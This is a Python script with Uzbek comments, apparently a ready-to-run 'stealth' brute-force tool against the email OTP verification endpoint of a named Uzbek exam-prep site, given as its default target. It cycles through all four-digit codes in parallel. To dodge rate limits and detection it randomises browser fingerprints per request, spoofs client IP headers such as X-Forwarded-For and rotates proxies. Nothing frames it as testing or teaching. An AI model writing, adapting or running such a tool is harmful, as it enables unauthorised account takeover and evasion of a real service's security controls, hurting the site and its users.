import requests
import argparse
import threading
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed


# Signal va hisoblagich
topildi_event = threading.Event()
natija_lock = threading.Lock()
hisoblagich = {"yuborildi": 0, "xato_429": 0}


# ==================== USER-AGENT RO'YXATI ====================
USER_AGENTS = [
    # Chrome - Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome - Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    # Chrome - Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    # Firefox - Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Firefox - Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0",
    # Firefox - Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Safari - Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    # Edge - Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    # Mobile - Android
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    # Mobile - iPhone
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    # Tablet
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-X810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

# ==================== TILLAR ====================
LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "uz-UZ,uz;q=0.9,ru;q=0.8,en;q=0.7",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
]

# ==================== SEC-CH-UA ====================
SEC_CH_UA_LIST = [
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="24"',
    '"Chromium";v="125", "Microsoft Edge";v="125", "Not-A.Brand";v="99"',
    '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
    '"Not_A Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"',
]

SEC_CH_UA_PLATFORM = ['"Windows"', '"macOS"', '"Linux"', '"Android"']

REFERERS = [
    "https://www.google.com/",
    "https://www.google.ru/",
    "https://yandex.ru/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://search.yahoo.com/",
    "",  # Ba'zan referer bo'lmaydi
]


def tasodifiy_ip():
    """Tasodifiy IP manzil generatsiya qilish"""
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def tasodifiy_fingerprint():
    """Har bir so'rov uchun noyob brauzer barmoq izi yaratadi"""
    ua = random.choice(USER_AGENTS)
    is_mobile = "Mobile" in ua or "iPhone" in ua or "iPad" in ua or "Android" in ua

    headers = {
        "Content-Type": "application/json",
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": random.choice([
            "gzip, deflate, br",
            "gzip, deflate, br, zstd",
            "gzip, deflate",
        ]),
        "Origin": "https://otaboyev-prep.uz",
        "Referer": random.choice(REFERERS) or "https://otaboyev-prep.uz/",
        "Connection": random.choice(["keep-alive", "close"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0", ""]),
        "Pragma": random.choice(["no-cache", ""]),

        # IP manzilni aldash (proxy orqali ishlaydi)
        "X-Forwarded-For": tasodifiy_ip(),
        "X-Real-IP": tasodifiy_ip(),
        "X-Originating-IP": tasodifiy_ip(),
        "CF-Connecting-IP": tasodifiy_ip(),
        "True-Client-IP": tasodifiy_ip(),
        "X-Client-IP": tasodifiy_ip(),
        "Forwarded": f"for={tasodifiy_ip()}",
    }

    # Chrome/Edge uchun sec-ch-ua headerslari
    if "Chrome" in ua or "Edg" in ua:
        headers["Sec-CH-UA"] = random.choice(SEC_CH_UA_LIST)
        headers["Sec-CH-UA-Mobile"] = "?1" if is_mobile else "?0"
        headers["Sec-CH-UA-Platform"] = random.choice(SEC_CH_UA_PLATFORM)
        headers["Sec-Fetch-Dest"] = "empty"
        headers["Sec-Fetch-Mode"] = "cors"
        headers["Sec-Fetch-Site"] = random.choice(["same-origin", "cross-site", "same-site"])

    # Bo'sh qiymatlarni tozalash
    headers = {k: v for k, v in headers.items() if v}

    return headers


def bitta_sorov(url, email, otp_code, jami, proxy_list=None):
    """Bitta OTP kod bilan noyob fingerprint yuboriladi"""

    if topildi_event.is_set():
        return None

    data = {
        "email": email,
        "otpCode": otp_code
    }

    # Har bir so'rov uchun yangi fingerprint
    headers = tasodifiy_fingerprint()

    # Proxy tanlash (agar berilgan bo'lsa)
    proxies = None
    proxy_info = ""
    if proxy_list:
        proxy = random.choice(proxy_list)
        proxies = {"http": proxy, "https": proxy}
        proxy_info = f" | Proxy: {proxy[-20:]}"

    try:
        javob = requests.post(
            url,
            json=data,
            headers=headers,
            proxies=proxies,
            timeout=15,
            allow_redirects=False
        )

        status = javob.status_code
        javob_matni = javob.text

        with natija_lock:
            hisoblagich["yuborildi"] += 1
            if status == 429:
                hisoblagich["xato_429"] += 1
            joriy = hisoblagich["yuborildi"]

        # Muvaffaqiyatni tekshirish
        if status == 200 and "token" in javob_matni:
            topildi_event.set()
            print(f"\n  {'*'*60}")
            print(f"  *  OTP KOD TOPILDI!")
            print(f"  *")
            print(f"  *  Email    : {email}")
            print(f"  *  OTP Code : {otp_code}")
            print(f"  *  Status   : {status}")
            print(f"  *  Urinish  : {joriy}/{jami}")
            print(f"  *  UA       : {headers['User-Agent'][:50]}...")
            print(f"  *")
            print(f"  *  Javob    : {javob_matni[:200]}")
            print(f"  {'*'*60}\n")
            return otp_code

        # 429 bo'lsa ogohlantirish
        if status == 429:
            print(f"  [429] {joriy:>5}/{jami} | OTP: {otp_code} | RATE LIMITED | 429 jami: {hisoblagich['xato_429']}{proxy_info}")
        else:
            print(f"  [-] {joriy:>5}/{jami} | OTP: {otp_code} | Status: {status} | IP: {headers.get('X-Forwarded-For','?')}{proxy_info}")

    except requests.exceptions.Timeout:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [T] {joriy:>5}/{jami} | OTP: {otp_code} | TIMEOUT")
    except requests.exceptions.ProxyError:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [P] {joriy:>5}/{jami} | OTP: {otp_code} | PROXY XATO")
    except requests.exceptions.ConnectionError:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [X] {joriy:>5}/{jami} | OTP: {otp_code} | ULANIB BO'LMADI")
    except Exception as e:
        with natija_lock:
            hisoblagich["yuborildi"] += 1
            joriy = hisoblagich["yuborildi"]
        print(f"  [?] {joriy:>5}/{jami} | OTP: {otp_code} | Xato: {e}")

    return None


def proxy_yuklash(fayl):
    """Proxy fayldan ro'yxatni o'qish"""
    try:
        with open(fayl, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except:
        return None


def otp_bruteforce(url, email, boshlanish=1, tugash=10000, threadlar=10, proxy_fayl=None):
    """OTP kodlarni noyob fingerprint bilan parallel sinab ko'radi"""

    kodlar = [f"{i:04d}" for i in range(boshlanish, tugash + 1)]
    jami = len(kodlar)

    # Proxylar
    proxy_list = None
    if proxy_fayl:
        proxy_list = proxy_yuklash(proxy_fayl)

    print(f"\n{'='*60}")
    print(f"  OTP BRUTEFORCE (STEALTH MODE)")
    print(f"{'='*60}")
    print(f"  URL       : {url}")
    print(f"  Email     : {email}")
    print(f"  Diapazon  : {kodlar[0]} — {kodlar[-1]}")
    print(f"  Jami      : {jami} ta kod")
    print(f"  Threadlar : {threadlar} ta")
    print(f"  Proxylar  : {len(proxy_list) if proxy_list else 'Yo`q (IP header spoofing)'} ta")
    print(f"  User-Agent: {len(USER_AGENTS)} xil")
    print(f"  Tillar    : {len(LANGUAGES)} xil")
    print(f"{'='*60}\n")

    topilgan = None

    with ThreadPoolExecutor(max_workers=threadlar) as executor:
        futures = {
            executor.submit(bitta_sorov, url, email, kod, jami, proxy_list): kod
            for kod in kodlar
        }

        for future in as_completed(futures):
            natija = future.result()
            if natija:
                topilgan = natija
                executor.shutdown(wait=False, cancel_futures=True)
                break

    print(f"\n{'='*60}")
    print(f"  NATIJA")
    print(f"{'='*60}")
    print(f"  Yuborildi : {hisoblagich['yuborildi']} ta")
    print(f"  429 xato  : {hisoblagich['xato_429']} ta")
    if topilgan:
        print(f"  TOPILDI   : {topilgan}")
    else:
        print(f"  Topilmadi")
    print(f"{'='*60}\n")

    return topilgan


def main():
    parser = argparse.ArgumentParser(
        description='OTP bruteforce — stealth rejim',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Misol:
  python otp_stealth.py -e user@gmail.com
  python otp_stealth.py -e user@gmail.com -t 20
  python otp_stealth.py -e user@gmail.com -t 30 --proxy proxies.txt

Proxy fayl formati (har bir qatorda bitta):
  http://IP:PORT
  http://user:pass@IP:PORT
  socks5://IP:PORT
        """
    )

    parser.add_argument('-e', '--email', required=True, help='Email manzil')
    parser.add_argument('-u', '--url', default='https://api.otaboyev-prep.uz/auth/verify-email', help='API URL')
    parser.add_argument('-b', '--boshlanish', type=int, default=1, help='Boshlang\'ich kod (standart: 1)')
    parser.add_argument('-g', '--tugash', type=int, default=10000, help='Oxirgi kod (standart: 10000)')
    parser.add_argument('-t', '--threadlar', type=int, default=10, help='Threadlar soni (standart: 10)')
    parser.add_argument('--proxy', type=str, default=None, help='Proxy ro\'yxati fayli (ixtiyoriy)')

    args = parser.parse_args()

    otp_bruteforce(args.url, args.email, args.boshlanish, args.tugash, args.threadlar, args.proxy)


if __name__ == '__main__':
    main()
